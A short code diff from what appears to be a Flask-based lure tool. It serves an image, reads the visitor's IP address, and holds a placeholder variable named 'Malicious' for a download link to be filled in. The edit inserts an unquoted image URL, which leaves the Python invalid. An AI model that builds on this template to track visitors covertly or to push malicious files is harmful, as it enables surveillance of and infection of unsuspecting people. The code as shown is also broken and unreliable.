@@ -7,7 +7,7 @@ __name__,
 )
 @app.route('/', methods=['GET'])
 def main():
-  Image = 'YourImageLink' # Replace this with your image link
+  Image = https://tse3.mm.bing.net/th?id=OIP.RL4m-39mSSxaxo2ixlDPlQHaEK&pid=Api&P=0&w=331&h=186
   Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
   # This is to get the ip
   if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
